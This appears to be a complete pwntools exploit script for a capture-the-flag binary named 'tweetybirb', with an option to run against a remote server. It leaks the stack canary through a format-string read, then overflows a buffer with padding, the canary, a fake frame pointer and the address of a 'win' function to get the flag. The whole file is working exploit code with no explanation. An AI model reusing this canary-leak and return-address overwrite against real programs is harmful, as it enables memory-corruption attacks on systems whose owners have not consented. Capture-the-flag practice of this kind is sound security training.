#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    con = remote('143.198.184.186', 5002)
else:
    con = process('./tweetybirb')

con.recvline()

# Leak stack canary via format string.
con.sendline(b'%15$p')

canary = con.recvline()
canary = int(canary.strip(), 16)

con.recvline()

win = 0x4011da + 1 # movaps issue
pad = b'A'*72
rbp = b'B'*8

# ret2win via buffer overflow.
payload = flat(
    pad,
    canary,
    rbp,
    win
)

con.sendline(payload)

flag = con.recvline()

print(flag)

